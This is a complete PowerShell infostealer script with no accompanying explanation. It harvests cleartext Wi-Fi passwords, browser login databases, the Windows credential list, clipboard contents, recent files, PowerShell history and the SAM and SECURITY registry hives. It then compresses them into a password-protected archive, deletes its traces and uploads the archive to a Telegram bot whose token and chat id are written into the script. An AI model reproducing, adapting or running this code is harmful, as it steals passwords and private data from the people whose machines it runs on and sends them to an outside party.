# Config
$OutputFolder = "$env:USERPROFILE\Desktop\SensitiveData_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
$ZipFile = "$env:USERPROFILE\Desktop\SensitiveData.zip"
$ZipPassword = "rushhiddenpass@@"

# Create output dir
New-Item -ItemType Directory -Path $OutputFolder -Force | Out-Null

# 1. Wi-Fi Passwords
netsh wlan export profile key=clear folder="$OutputFolder" | Out-Null
Get-ChildItem -Path "$OutputFolder\*.xml" | ForEach-Object {
    $SSID = ([xml](Get-Content $_.FullName)).WLANProfile.SSIDConfig.SSID.name
    $Password = ([xml](Get-Content $_.FullName)).WLANProfile.MSM.Security.sharedKey.keyMaterial
    "Wi-Fi: $SSID | Password: $Password" | Out-File -Append -FilePath "$OutputFolder\WiFi_Passwords.txt"
    Remove-Item $_.FullName -Force
}

# 2. Browser Data
$Browsers = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data",
    "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json"
)
foreach ($BrowserPath in $Browsers) {
    if (Test-Path $BrowserPath) {
        Copy-Item -Path $BrowserPath -Destination "$OutputFolder\Browser_$(Split-Path $BrowserPath -Leaf)" -Force
    }
}

# 3. Credentials & System Data
cmdkey /list | Out-File "$OutputFolder\Windows_Credentials.txt"
Copy-Item "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Recent\*" -Destination "$OutputFolder\RecentFiles" -Force -Recurse
Get-Clipboard | Out-File "$OutputFolder\Clipboard_Data.txt"
reg save HKLM\SECURITY "$OutputFolder\SECURITY.hiv" 2>&1 | Out-Null
reg save HKLM\SAM "$OutputFolder\SAM.hiv" 2>&1 | Out-Null
Copy-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Destination "$OutputFolder\PS_History.txt" -Force

# 4. Compress & Exfiltrate
if (Test-Path "$env:ProgramFiles\7-Zip\7z.exe") {
    & "$env:ProgramFiles\7-Zip\7z.exe" a -tzip -p$ZipPassword -mhe $ZipFile "$OutputFolder\*"
} else {
    Compress-Archive -Path "$OutputFolder\*" -DestinationPath $ZipFile -Force
}

# 5. Cleanup & Telegram Exfiltration
Remove-Item $OutputFolder -Recurse -Force
curl.exe -X POST https://api.telegram.org/bot8150745156:AAFA8XA2CBZ58tDJFKPOWI5FsuECA1RBp4w/sendDocument -F chat_id=6149198429 -F document=@"$ZipFile" -F caption="Data Exfiltrated"
